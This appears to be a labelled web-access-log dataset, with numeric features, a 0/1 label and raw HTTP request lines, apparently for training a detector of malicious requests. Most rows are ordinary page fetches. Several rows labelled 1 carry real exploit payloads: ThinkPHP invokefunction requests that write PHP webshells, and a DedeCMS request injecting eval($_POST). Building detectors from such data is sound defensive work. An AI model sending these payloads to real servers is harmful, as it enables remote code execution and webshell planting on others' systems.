64,1,404,284,7,35,6,8,1,GET /honeypot//%22http://amunhoney.sourceforge.net//%22 HTTP/1.1
51,1,404,284,7,23,5,8,1,GET /honeypot//%22http://glastopf.org//%22 HTTP/1.1
53,1,404,284,7,25,6,7,1,GET /honeypot//%22http://www.maxmind.com/%22 HTTP/1.1
58,1,404,284,7,30,5,8,1,GET /honeypot//%22https://twitter.com/sooshie/%22 HTTP/1.1
59,1,404,284,7,31,5,8,1,GET /honeypot//%22https://twitter.com/theroxyd/%22 HTTP/1.1
49,1,301,481,7,22,5,3,1,GET /honeypot/bsidesdfw%20-%202014.ipynb HTTP/1.1
160,3,418,746,23,74,34,4,1,GET /?s=index/%5Cthink%5Ctemplate%5Cdriver%5Cfile/write&cacheFile=ppeeu.php&content=%3C?php%20mb_ereg_replace('.*'_@$_REQUEST%5B_%5D_%20''_%20'e');?%3E HTTP/1.1
228,5,418,746,30,105,47,5,1,GET /?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=file_put_contents&vars%5B1%5D%5B%5D=txual.php&vars%5B1%5D%5B%5D=%3C?php%20mb_ereg_replace('.*'_@$_REQUEST%5B_%5D_%20''_%20'e');?%3E$ HTTP/1.1
131,3,418,746,18,63,24,6,1,GET /uploads/dede/sys_verifies.php?action=getfiles&refiles%5B0%5D=123&refiles%5B1%5D=%5C%22;eval($_POST%5Bysy%5D);die();// HTTP/1.1
53,1,200,1530,10,30,3,4,0,GET /Datasets%20Description/Network/ftp.html HTTP/1.1
53,1,200,1585,10,30,3,4,0,GET /Datasets%20Description/Network/ssl.html HTTP/1.1
14,1,200,13150,7,0,1,2,0,GET / HTTP/1.1
27,1,404,305,7,11,2,3,0,GET /css/style.css HTTP/1.1
30,1,200,27916,7,14,3,2,0,GET /twitter-icon.png HTTP/1.1
29,1,200,7556,10,10,3,2,0,GET /GitHub-Mark.png HTTP/1.1
39,1,200,713,7,22,2,4,0,GET /bootstrap/img/favicon.ico HTTP/1.1
62,1,304,276,14,34,3,4,0,GET /Datasets%20Description/PE_malware/OPCleaver.html HTTP/1.1
48,1,301,543,7,19,7,3,0,GET /self.logs/access.log.2017-03-14.gz HTTP/1.1
53,1,200,1543,10,30,3,4,0,GET /Datasets%20Description/Network/dns.html HTTP/1.1
24,1,200,32448,7,8,2,3,0,GET /self.logs/ HTTP/1.1
55,1,200,1645,10,32,3,4,0,GET /Datasets%20Description/Network/weird.html HTTP/1.1
60,1,200,795,18,22,6,4,0,GET /Datasets%20Description/HTML_Bro_log_2/?C=M;O=D HTTP/1.1
56,1,200,1650,10,33,3,4,0,GET /Datasets%20Description/Network/notice.html HTTP/1.1
48,1,200,23077,7,19,7,3,0,GET /self.logs/access.log.2019-04-26.gz HTTP/1.1
48,1,200,24264,7,19,7,3,0,GET /self.logs/access.log.2019-11-22.gz HTTP/1.1
24,1,200,377,7,9,2,2,0,GET /robots.txt HTTP/1.1
47,1,200,2797,7,18,7,3,0,GET /self.logs/error.log.2017-10-18.gz HTTP/1.1
